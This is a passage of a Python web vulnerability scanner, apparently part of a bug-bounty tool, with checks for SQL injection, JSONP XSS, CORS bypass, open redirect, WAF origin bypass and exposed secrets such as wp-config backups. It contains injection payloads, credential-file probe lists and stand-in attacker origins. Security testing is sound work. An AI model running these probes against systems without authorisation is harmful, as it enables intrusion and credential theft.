            f"{probe_url}: GraphQL query accepted via GET - candidate for CSRF-chaining "
            f"(rides along with victim cookies with no preflight); confirming real impact "
            f"needs an authenticated session to see what a forced query could exfiltrate"
        )
    return None


# ---------------------------------------------------------------------
# 71. SQL injection, boolean-based blind
# ---------------------------------------------------------------------
_SQLI_BOOLEAN_TRUE = "' AND '1'='1"
_SQLI_BOOLEAN_FALSE = "' AND '1'='2"


async def check_sql_injection_boolean_based(url: str) -> dict | None:
    """
    Complements check_blind_sqli_timing (time-based) and
    check_sqli_error_based (error-signature) with the third classic
    blind-SQLi technique: compare responses for an always-TRUE injected
    condition vs an always-FALSE one against the SAME baseline. If the
    app is vulnerable, the TRUE payload's response matches the baseline
    (query behaves normally) while the FALSE payload's response differs
    (query returns no rows / different content) - a clean three-way
    comparison, not a single substring match, which is what keeps this
    safe from the SSTI-class false-positive problem.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text
            except httpx.HTTPError:
                return None

            for param_name in existing_params:
                test_params_true = dict(existing_params)
                test_params_true[param_name] = existing_params[param_name] + _SQLI_BOOLEAN_TRUE
                true_url = parsed.copy_with(params=test_params_true)

                test_params_false = dict(existing_params)
                test_params_false[param_name] = existing_params[param_name] + _SQLI_BOOLEAN_FALSE
                false_url = parsed.copy_with(params=test_params_false)

                try:
                    true_resp = await client.get(true_url)
                    false_resp = await client.get(false_url)
                except httpx.HTTPError:
                    continue

                true_matches_baseline = (
                    true_resp.status_code == baseline_resp.status_code
                    and abs(len(true_resp.text) - len(baseline_body)) < max(20, len(baseline_body) * 0.02)
                )
                false_differs_from_baseline = (
                    false_resp.status_code != baseline_resp.status_code
                    or abs(len(false_resp.text) - len(baseline_body)) > max(20, len(baseline_body) * 0.02)
                )

                if true_matches_baseline and false_differs_from_baseline:
                    return {
                        "vuln_type": "sql_injection_boolean_based",
                        "severity": "critical",
                        "evidence": (
                            f"{url} parameter '{param_name}': baseline body length "
                            f"{len(baseline_body)}. Injecting an always-TRUE condition "
                            f"({_SQLI_BOOLEAN_TRUE!r}) produced a response matching the "
                            f"baseline ({len(true_resp.text)} bytes, status "
                            f"{true_resp.status_code}), while an always-FALSE condition "
                            f"({_SQLI_BOOLEAN_FALSE!r}) produced a different response "
                            f"({len(false_resp.text)} bytes, status {false_resp.status_code}) - "
                            f"the query logic is responding to injected boolean conditions."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: boolean-based SQLi check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 72. SVG file upload acceptance flagging (recon-only)
# ---------------------------------------------------------------------
async def check_insecure_svg_upload_flagging(url: str) -> str | None:
    """
    Narrower complement to check_file_upload_form_candidate (batch 14):
    specifically flags upload forms whose accept attribute includes SVG
    (image/svg+xml or .svg). SVG files can embed <script> tags and are
    frequently rendered inline or served with a permissive content-type,
    making SVG upload a well-known path to stored XSS that a generic
    "has a file upload" note doesn't call out specifically. Returns a
    plain string, NOT a findings dict, and never uploads anything -
    same reasoning as the general file-upload check.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: SVG upload flagging check failed for %s: %s", url, exc)
        return None

    body = resp.text
    for file_input in _FILE_INPUT_RE.findall(body):
        if "svg" in file_input.lower():
            return (
                f"{url}: file upload form explicitly accepts SVG (accept attribute "
                f"references svg) - SVG can embed <script> and is a well-known stored-XSS "
                f"upload vector; not tested here to avoid leaving uploaded artifacts on the "
                f"target"
            )
    return None


# ---------------------------------------------------------------------
# 73. JSONP callback parameter XSS
# ---------------------------------------------------------------------
_JSONP_PARAM_NAMES = ["callback", "jsonp", "cb", "jsonpcallback"]


async def check_jsonp_callback_xss(url: str) -> dict | None:
    """
    JSONP endpoints wrap a JSON response in a caller-controlled function
    name: callback({...}). If the callback parameter isn't validated
    against a strict identifier pattern, injecting script-breaking
    characters produces attacker-controlled JavaScript that executes
    when the response is loaded as a <script src>. Same unique-marker
    discipline as check_reflected_xss: a UUID fragment in the payload
    means a coincidental match is effectively impossible, so this
    doesn't need baseline diffing.
    """
    parsed = httpx.URL(url)
    existing_params = dict(parsed.params)
    marker_id = uuid.uuid4().hex[:10]
    payload = f"alert(/swas{marker_id}/)//"

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for param_name in _JSONP_PARAM_NAMES:
                test_params = dict(existing_params)
                test_params[param_name] = payload
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                content_type = resp.headers.get("content-type", "").lower()
                if "javascript" not in content_type and "json" not in content_type:
                    continue
                if payload not in resp.text:
                    continue
                # Confirm the payload wasn't JSON-string-escaped into harmlessness
                # (e.g. "alert(\/swas...\/)//" inside a quoted string literal) -
                # check the few characters immediately before it for an escaping
                # backslash-quote, which would mean it's inert data, not live code.
                idx = resp.text.find(payload)
                preceding = resp.text[max(0, idx - 5):idx]
                if '\\"' in preceding or "\\'" in preceding:
                    continue
                return {
                    "vuln_type": "jsonp_callback_xss",
                    "severity": "high",
                    "evidence": (
                        f"{test_url}: JSONP parameter '{param_name}' with payload "
                        f"{payload!r} was reflected unescaped into a "
                        f"javascript/json-typed response - executes as script when "
                        f"loaded via <script src>."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: JSONP callback XSS check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 74. Backup/temp file disclosure
# ---------------------------------------------------------------------
_BACKUP_FILE_SUFFIXES = [".bak", ".old", ".orig", ".swp", "~", ".save", ".backup"]
_SOURCE_CODE_MARKERS = ["<?php", "<%", "import ", "function ", "SELECT ", "password"]


async def check_backup_temp_file_disclosure(url: str) -> dict | None:
    """
    Appends common backup/editor-temp-file suffixes to a discovered
    URL's path and checks whether the result returns 200 with content
    meaningfully different from a real 404, AND containing something
    that looks like source code rather than a rendered page - editors
    (vim swap files) and deploy scripts routinely leave .bak/.orig/~
    copies of source files sitting next to the real ones in the web
    root. Baseline-diffed against the real 404 behavior first.
    """
    parsed = httpx.URL(url)
    path = str(parsed.path)
    if not path or path == "/":
        return None

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                nonexistent_probe = parsed.copy_with(path=path + ".swas-nonexistent-" + uuid.uuid4().hex[:8])
                baseline_404_resp = await client.get(nonexistent_probe)
                baseline_404_body = baseline_404_resp.text[:2000]
            except httpx.HTTPError:
                return None

            for suffix in _BACKUP_FILE_SUFFIXES:
                test_url = parsed.copy_with(path=path + suffix)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text[:3000]
                if body[:2000] == baseline_404_body:
                    continue  # same content as a real 404 - server returns 200 for everything
                for marker in _SOURCE_CODE_MARKERS:
                    if marker in body:
                        return {
                            "vuln_type": "backup_temp_file_disclosure",
                            "severity": "high",
                            "evidence": (
                                f"{test_url}: returned 200 with content distinct from the "
                                f"server's real 404 response, and containing a source-code "
                                f"marker ({marker!r}) - a backup/temp copy of source is "
                                f"publicly readable."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: backup/temp file check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 75. Publicly-listable Azure Blob Storage container
# ---------------------------------------------------------------------
_AZURE_BLOB_REFERENCE_RE = re.compile(
    r"([a-z0-9][a-z0-9-]{1,61}[a-z0-9])\.blob\.core\.windows\.net/([a-z0-9][a-z0-9-]{1,61}[a-z0-9])",
    re.IGNORECASE,
)


async def check_azure_blob_public_exposure(url: str) -> dict | None:
    """
    Same technique and proof bar as check_cloud_storage_bucket_exposure
    (batch 9), targeting Azure Blob Storage instead of S3/GCS: scans
    page content for account.blob.core.windows.net/container
    references, then issues a direct, read-only container-listing
    request. Only fires on an actual object listing
    (<EnumerationResults>), not just a reachable container.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(url)
            except httpx.HTTPError:
                return None
            body = resp.text

            seen = set()
            for account, container in _AZURE_BLOB_REFERENCE_RE.findall(body):
                key = f"{account}/{container}".lower()
                if key in seen:
                    continue
                seen.add(key)
                listing_url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
                try:
                    listing_resp = await client.get(listing_url)
                except httpx.HTTPError:
                    continue
                if "<EnumerationResults" in listing_resp.text[:2000]:
                    return {
                        "vuln_type": "publicly_listable_azure_blob_container",
                        "severity": "high",
                        "evidence": (
                            f"Azure Blob container '{container}' on account '{account}' "
                            f"(referenced on {url}) is publicly listable at {listing_url} - "
                            f"returned an actual <EnumerationResults> object listing."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: Azure blob check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 76. Origin IP disclosure / WAF-CDN bypass
# ---------------------------------------------------------------------
async def check_origin_ip_waf_bypass(host: str) -> dict | None:
    """
    Resolves the host's A record via DNS-over-HTTPS, then compares a
    normal hostname-based request against a direct request to the raw
    IP (with the Host header stripped to a generic value). If a WAF/CDN
    sits in front of the hostname but the origin server is directly
    reachable on its IP and serves the SAME real content, any
    hostname-based protection (WAF rules, rate limiting, geo-blocking)
    can be bypassed entirely by hitting the origin directly. Proof bar:
    the IP-direct response must actually resemble real application
    content (reasonable size, 200 status), not a default nginx/apache
    placeholder page or a connection failure.
    """
    domain = httpx.URL(host).host
    if not domain or domain.replace(".", "").isdigit():
        return None  # already a bare IP

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False) as client:
            try:
                dns_resp = await client.get(
                    f"https://cloudflare-dns.com/dns-query?name={domain}&type=A",
                    headers={"Accept": "application/dns-json"},
                )
                dns_data = dns_resp.json()
            except Exception:
                return None
            answers = [a.get("data") for a in dns_data.get("Answer", []) if a.get("type") == 1]
            if not answers:
                return None
            origin_ip = answers[0]

            try:
                hostname_resp = await client.get(host)
            except httpx.HTTPError:
                return None

            scheme = "https" if host.startswith("https") else "http"
            ip_url = f"{scheme}://{origin_ip}/"
            try:
                ip_resp = await client.get(ip_url, headers={"Host": domain})
            except httpx.HTTPError:
                return None

            if (
                ip_resp.status_code == 200
                and len(ip_resp.text) > 200
                and abs(len(ip_resp.text) - len(hostname_resp.text)) < max(200, len(hostname_resp.text) * 0.3)
            ):
                return {
                    "vuln_type": "origin_ip_waf_cdn_bypass",
                    "severity": "high",
                    "evidence": (
                        f"{domain} resolves to {origin_ip}, and requesting that IP directly "
                        f"(with Host: {domain} set explicitly) returned a "
                        f"{len(ip_resp.text)}-byte response closely matching the real "
                        f"hostname-based response ({len(hostname_resp.text)} bytes) - the "
                        f"origin server is directly reachable, bypassing any WAF/CDN/rate-"
                        f"limiting that only protects the hostname."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: origin IP WAF bypass check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 77. CORS subdomain-suffix validation bypass
# ---------------------------------------------------------------------
async def check_cors_subdomain_suffix_bypass(url: str) -> dict | None:
    """
    Tests for a naive CORS origin-validator that checks "does the Origin
    contain/end with my domain" rather than an exact allowlist match -
    sending Origin: https://{domain}.evil-swas-probe.test (the real
    domain as a PREFIX of an attacker-controlled one) or
    https://evil-swas-probe-{domain} (domain concatenated without a
    separator) can slip past a substring/endswith check that isn't
    anchored properly. Distinct from check_cors_null_origin_bypass and
    check_cors_wildcard_with_credentials - this targets a third,
    separate CORS misconfiguration pattern. Deterministic header
    reflection check, zero substring-coincidence risk.
    """
    domain = httpx.URL(url).host
    if not domain:
        return None
    attacker_origins = [
        f"https://{domain}.evil-swas-probe.test",
        f"https://evil-swas-probe{domain}",
    ]

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for attacker_origin in attacker_origins:
                try:
                    resp = await client.get(url, headers={"Origin": attacker_origin})
                except httpx.HTTPError:
                    continue
                acao = resp.headers.get("access-control-allow-origin", "").strip()
                acac = resp.headers.get("access-control-allow-credentials", "").strip().lower()
                if acao == attacker_origin and acac == "true":
                    return {
                        "vuln_type": "cors_subdomain_suffix_bypass",
                        "severity": "high",
                        "evidence": (
                            f"{url}: sending Origin: {attacker_origin} (contains the real "
                            f"domain as a substring, not an actual subdomain) was reflected "
                            f"back exactly in Access-Control-Allow-Origin with "
                            f"Access-Control-Allow-Credentials: true - the origin validator "
                            f"uses an unanchored substring/endswith check instead of a real "
                            f"allowlist match."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: CORS subdomain suffix bypass check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 78. Exposed Prometheus metrics endpoint
# ---------------------------------------------------------------------
async def check_exposed_prometheus_metrics(host: str) -> dict | None:
    """
    Checks the standard /metrics path for Prometheus's distinctive
    exposition format (# HELP / # TYPE comment lines followed by
    metric_name{labels} value data). This format is specific enough
    that a match essentially never happens by coincidence - unrelated
    pages don't produce "# HELP http_requests_total ..." followed by a
    numeric value on the next line. An exposed metrics endpoint can leak
    internal hostnames, request patterns, and sometimes business metrics
    (signups, transaction counts) with no authentication.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(base + "/metrics")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: Prometheus metrics check failed for %s: %s", host, exc)
        return None

    if resp.status_code != 200:
        return None
    body = resp.text[:5000]
    if re.search(r"^# HELP \S+", body, re.MULTILINE) and re.search(r"^# TYPE \S+ \w+", body, re.MULTILINE):
        return {
            "vuln_type": "exposed_prometheus_metrics",
            "severity": "medium",
            "evidence": (
                f"{base}/metrics is publicly accessible and returns valid Prometheus "
                f"exposition-format data (# HELP/# TYPE lines present) with no "
                f"authentication - internal operational and potentially business metrics "
                f"are exposed."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 79. Exposed dependency manifest (package.json, requirements.txt, etc.)
# ---------------------------------------------------------------------
_DEPENDENCY_MANIFEST_PATHS = [
    ("/package.json", '"dependencies"'),
    ("/requirements.txt", None),
    ("/Gemfile.lock", "GEM"),
    ("/composer.json", '"require"'),
]


async def check_dependency_manifest_exposure(host: str) -> dict | None:
    """
    Checks for publicly-accessible dependency manifests at the web root.
    These disclose exact package names and versions, which is real
    intel for matching against known CVEs - a different attack surface
    from source code itself. requirements.txt has no fixed marker
    string (it's just package==version lines), so that one is proven by
    matching typical `name==x.y.z` or `name>=x.y.z` line shapes instead
    of a literal substring.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path, marker in _DEPENDENCY_MANIFEST_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text[:5000]
                if marker is not None:
                    if marker not in body:
                        continue
                else:
                    if not re.search(r"^[A-Za-z0-9_.\-]+\s*[=<>!~]{1,2}=\s*[\d.]+", body, re.MULTILINE):
                        continue
                return {
                    "vuln_type": "exposed_dependency_manifest",
                    "severity": "medium",
                    "evidence": (
                        f"{base}{path} is publicly accessible and contains a real dependency "
                        f"manifest - exact package/version intel usable for known-CVE matching "
                        f"against this application's stack."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: dependency manifest check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 80. Missing HSTS on HTTPS (recon-only)
# ---------------------------------------------------------------------
async def check_hsts_missing(url: str) -> str | None:
    """
    Checks for the absence of Strict-Transport-Security on an HTTPS
    response. Returns a plain string, NOT a findings dict - like
    clickjacking and missing SRI, this is a real gap but almost always
    rated Informative standalone; it matters mainly in combination with
    an actual downgrade-attack demonstration (SSLstrip-style), which
    this scanner doesn't attempt.
    """
    if not url.lower().startswith("https://"):
        return None
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: HSTS check failed for %s: %s", url, exc)
        return None

    if not resp.headers.get("strict-transport-security"):
        return (
            f"{url}: HTTPS response has no Strict-Transport-Security header - almost always "
            f"Informative standalone; only meaningful paired with a demonstrated downgrade "
            f"scenario, which this scanner doesn't attempt"
        )
    return None


# ---------------------------------------------------------------------
# 81. Swagger/OpenAPI documented-endpoint enumeration (recon-only)
# ---------------------------------------------------------------------
_SWAGGER_SPEC_PATHS = ["/swagger.json", "/openapi.json", "/v2/swagger.json", "/v3/api-docs"]


async def check_swagger_path_enumeration_unauth(host: str) -> str | None:
    """
    If an OpenAPI/Swagger spec is exposed, counts and lists the
    documented paths rather than trying to invoke any of them. Returns
    a plain string, NOT a findings dict - check_swagger_exposure (batch
    1) already files the exposure itself as a finding; this is a
    separate recon aid pointing at exactly which endpoints are worth
    manually testing next, not a new vulnerability claim.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in _SWAGGER_SPEC_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                try:
                    spec = resp.json()
                except Exception:
                    continue
                paths = spec.get("paths")
                if isinstance(paths, dict) and paths:
                    sample = list(paths.keys())[:8]
                    return (
                        f"{base}{path}: documented API spec lists {len(paths)} endpoint(s) - "
                        f"sample: {sample} - candidates for manual authorization/access-"
                        f"control testing"
                    )
    except httpx.HTTPError as exc:
        logger.info("detective: Swagger path enumeration failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 82. Session-shaped cookie missing SameSite (recon-only)
# ---------------------------------------------------------------------
_SESSION_COOKIE_NAME_RE = re.compile(r"(session|sess|sid|auth|token)", re.IGNORECASE)


async def check_insecure_cookie_without_samesite(url: str) -> str | None:
    """
    Flags session/auth-shaped cookies set without a SameSite attribute.
    Returns a plain string, NOT a findings dict - modern browsers default
    to SameSite=Lax when unset, which already blocks most cross-site
    request scenarios, so a missing explicit attribute is much weaker
    signal than it used to be and is frequently rated Informative.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: cookie SameSite check failed for %s: %s", url, exc)
        return None

    set_cookie_headers = resp.headers.get_list("set-cookie") if hasattr(resp.headers, "get_list") else []
    for raw_cookie in set_cookie_headers:
        cookie_name = raw_cookie.split("=", 1)[0].strip()
        if _SESSION_COOKIE_NAME_RE.search(cookie_name) and "samesite" not in raw_cookie.lower():
            return (
                f"{url}: cookie '{cookie_name}' (session/auth-shaped name) set without an "
                f"explicit SameSite attribute - modern browsers default to Lax when unset, "
                f"which already blocks most cross-site scenarios, so this is frequently "
                f"Informative on its own"
            )
    return None


# ---------------------------------------------------------------------
# 83. Session identifier passed in URL query string (recon-only)
# ---------------------------------------------------------------------
_URL_SESSION_ID_PARAM_RE = re.compile(r"^(phpsessid|jsessionid|asp\.net_sessionid|sid|session_id)$", re.IGNORECASE)


async def check_session_id_in_url(url: str) -> str | None:
    """
    Flags a session identifier (PHPSESSID, JSESSIONID, ASP.NET_SessionId,
    etc.) being carried directly in the URL query string rather than
    only in a cookie. Returns a plain string, NOT a findings dict -
    distinct from the general check_referrer_policy_sensitive_leak
    (which matches broader token-shaped names): this specifically names
    the session-identifier pattern for report clarity. Real impact
    (leaking a live session via browser history, Referer, or server
    logs) needs the same Referrer-Policy/third-party-resource
    confirmation that check does, not re-derived here.
    """
    parsed = httpx.URL(url)
    for param_name in parsed.params:
        if _URL_SESSION_ID_PARAM_RE.match(param_name):
            return (
                f"{url}: session identifier carried in the URL query string (parameter "
                f"'{param_name}') rather than only in a cookie - candidate for session-"
                f"leak-via-history/logs/Referer review"
            )
    return None


# ---------------------------------------------------------------------
# 84. Open redirect via HTML meta-refresh injection
# ---------------------------------------------------------------------
_META_REFRESH_PARAM_RE = re.compile(r"url|redirect|next|return|dest|continue|target", re.IGNORECASE)


async def check_open_redirect_via_meta_refresh(url: str) -> dict | None:
    """
    Complements the header-based open redirect checks (batch 1, batch
    12) with the client-side equivalent: a URL parameter reflected
    unescaped into a <meta http-equiv="refresh" content="...url=..."> 
    tag redirects the browser without ever touching a Location header,
    which bypasses server-side redirect-target validation that only
    inspects outgoing Location headers. Proof uses a unique marker
    domain, so it's a deterministic exact-match, not a coincidental
    substring.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)
    redirect_params = [p for p in existing_params if _META_REFRESH_PARAM_RE.search(p)]
    if not redirect_params:
        return None

    marker_domain = f"evil-swas-meta-{uuid.uuid4().hex[:8]}.test"
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for param_name in redirect_params:
                test_params = dict(existing_params)
                test_params[param_name] = f"http://{marker_domain}/"
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue
                match = re.search(
                    r'<meta[^>]+http-equiv=["\']refresh["\'][^>]+content=["\'][^"\']*' + re.escape(marker_domain),
                    resp.text, re.IGNORECASE,
                )
                if match:
                    return {
                        "vuln_type": "open_redirect_meta_refresh",
                        "severity": "medium",
                        "evidence": (
                            f"{test_url}: parameter '{param_name}' was reflected unescaped "
                            f"into a <meta http-equiv=\"refresh\"> tag pointing at an "
                            f"attacker-controlled domain - client-side redirect that bypasses "
                            f"Location-header-only validation. Note: open redirect is commonly "
                            f"rated Informative without chained impact."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: meta-refresh open redirect check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 85. Exposed WSDL / SOAP service definition
# ---------------------------------------------------------------------
async def check_exposed_wsdl_soap_service(url: str) -> dict | None:
    """
    Appends ?wsdl to a discovered URL and checks for a genuine WSDL XML
    document - a very specific structural signature (wsdl:definitions
    root element with operation listings), so a match essentially never
    happens by coincidence. Discloses the full internal SOAP method
    surface, parameter types, and often internal endpoint URLs.
    """
    probe_url = url + ("&wsdl" if "?" in url else "?wsdl")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(probe_url)
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: WSDL exposure check failed for %s: %s", url, exc)
        return None

    body = resp.text[:5000]
    if resp.status_code == 200 and re.search(r"<(?:wsdl:)?definitions\b", body, re.IGNORECASE) and "<operation" in body.lower():
        op_count = len(re.findall(r"<(?:wsdl:)?operation\b", body, re.IGNORECASE))
        return {
            "vuln_type": "exposed_wsdl_soap_service",
            "severity": "medium",
            "evidence": (
                f"{probe_url}: returned a genuine WSDL document listing {op_count} SOAP "
                f"operation(s) - full internal method surface and parameter types disclosed."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 86. Predictable UUID version used as a resource identifier (recon-only)
# ---------------------------------------------------------------------
_UUID_IN_URL_RE = re.compile(
    r"\b[0-9a-f]{8}-[0-9a-f]{4}-([0-9a-f])[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}\b", re.IGNORECASE
)


async def check_predictable_uuid_version(url: str) -> str | None:
    """
    If a URL contains a UUID used as a resource identifier, checks its
    version nibble - UUIDv1 encodes a timestamp and the generating
    machine's MAC address and is technically enumerable/predictable,
    unlike UUIDv4 (fully random). Returns a plain string, NOT a
    findings dict - a v1 UUID being used isn't itself a confirmed
    vulnerability; real impact needs demonstrating that enumeration
    actually reaches another user's resource (i.e., it's really an IDOR
    candidate wearing a UUID instead of a sequential integer).
    """
    match = _UUID_IN_URL_RE.search(url)
    if not match:
        return None
    version = match.group(1).lower()
    if version == "1":
        return (
            f"{url}: contains a UUIDv1 (timestamp + MAC-address based, technically "
            f"enumerable) used as a resource identifier - candidate for IDOR-style testing "
            f"the same way check_idor_candidate flags sequential integer IDs; a v1 UUID "
            f"alone doesn't confirm access-control impact"
        )
    return None


# ---------------------------------------------------------------------
# 87. HTTP TRACE method enabled (recon-only)
# ---------------------------------------------------------------------
async def check_http_trace_method_enabled(host: str) -> str | None:
    """
    Checks whether the TRACE method is enabled - historically used for
    Cross-Site Tracing (XST) to read HttpOnly cookies in old browsers.
    Returns a plain string, NOT a findings dict - modern browsers have
    largely closed the XST vector regardless of whether TRACE is
    enabled server-side, so this is frequently rated Informative,
    same reasoning as check_hsts_missing and check_clickjacking_missing_protection.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                resp = await client.request("TRACE", base + "/")
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: TRACE method check failed for %s: %s", host, exc)
        return None

    if resp.status_code == 200:
        return (
            f"{base}: TRACE method is enabled (200 response) - historically relevant to "
            f"Cross-Site Tracing, but modern browsers have largely closed that vector "
            f"regardless, so this is frequently rated Informative"
        )
    return None


# ---------------------------------------------------------------------
# 88. Exposed docker-compose.yml
# ---------------------------------------------------------------------
async def check_exposed_docker_compose_file(host: str) -> dict | None:
    """
    Checks for a publicly-accessible docker-compose.yml/.yaml at the web
    root. Proof requires BOTH a services: block and an image: reference
    - generic enough that random text files won't produce this pair of
    YAML-shaped markers together, but specific enough to real compose
    files. Discloses full service architecture and frequently inline
    environment variables/secrets.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in ("/docker-compose.yml", "/docker-compose.yaml"):
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text[:5000]
                if re.search(r"^services:\s*$", body, re.MULTILINE) and re.search(r"^\s*image:\s*\S+", body, re.MULTILINE):
                    return {
                        "vuln_type": "exposed_docker_compose_file",
                        "severity": "high",
                        "evidence": (
                            f"{base}{path} is publicly accessible and contains a real "
                            f"docker-compose services definition - full service "
                            f"architecture disclosed, frequently including inline "
                            f"environment variables/secrets."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: docker-compose exposure check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 89. WordPress wp-config.php backup/temp file exposure
# ---------------------------------------------------------------------
_WP_CONFIG_BACKUP_PATHS = [
    "/wp-config.php.bak", "/wp-config.php~", "/wp-config.php.save",
    "/wp-config.php.orig", "/wp-config.php.swp", "/wp-config.bak",
]
_WP_CONFIG_MARKERS = ["DB_PASSWORD", "DB_NAME", "AUTH_KEY", "wpdb"]


async def check_wordpress_config_backup_exposure(host: str) -> dict | None:
    """
    Directly probes well-known wp-config.php backup filenames at the
    web root - distinct from check_backup_temp_file_disclosure (batch
    16), which only appends backup suffixes to URLs already discovered
    by recon. wp-config.php is rarely linked from anywhere so generic
    discovery-based crawling won't surface it; this proactively checks
    for it regardless. Proof requires a WordPress-specific config
    constant marker (DB_PASSWORD, AUTH_KEY, etc.), not just a 200.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in _WP_CONFIG_BACKUP_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code != 200:
                    continue
                body = resp.text[:5000]
                if any(marker in body for marker in _WP_CONFIG_MARKERS):
                    return {
                        "vuln_type": "wordpress_config_backup_exposure",
                        "severity": "critical",
                        "evidence": (
                            f"{base}{path} is publicly accessible and contains WordPress "
                            f"config constants (DB credentials, auth keys) - full database "
                            f"and site secret compromise."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: wp-config backup check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 90. GraphQL error response leaking a stack trace
# ---------------------------------------------------------------------
_STACK_TRACE_SIGNATURES = [
    "/node_modules/", "at Object.<anonymous>", "Traceback (most recent call last)",
    "at Function.", "\\n    at ",
]


async def check_graphql_error_stack_trace_leak(url: str) -> dict | None:
    """
    Sends a deliberately malformed GraphQL query and checks whether the
    error response includes a full stack trace (file paths inside
    node_modules, Python traceback formatting, etc.) instead of a
    generic error message. These signatures are specific enough to
    programming-language internals that they don't need baseline
    diffing the way a short English-word substring would.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.post(
                    url,
                    content='{"query": "{ this is not valid graphql syntax !!!"}',
                    headers={"Content-Type": "application/json"},
                )
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: GraphQL stack trace leak check failed for %s: %s", url, exc)
        return None

    body = resp.text[:5000]
    for sig in _STACK_TRACE_SIGNATURES:
        if sig in body:
            return {
                "vuln_type": "graphql_error_stack_trace_leak",
                "severity": "medium",
                "evidence": (
                    f"{url}: a deliberately malformed GraphQL query returned an error "
                    f"response containing a stack-trace signature ({sig!r}) - internal file "
                    f"paths and framework internals disclosed instead of a generic error."
                ),
            }
    return None


# ---------------------------------------------------------------------
# 91. Exposed DevOps tool panel (Jenkins/Jira/Confluence)
# ---------------------------------------------------------------------
_DEVOPS_PANEL_PATHS = [
    ("/jenkins", "Dashboard [Jenkins]", "Jenkins"),
    ("/jenkins/login", "Dashboard [Jenkins]", "Jenkins"),
    ("/jira", 'id="jira"', "Jira"),
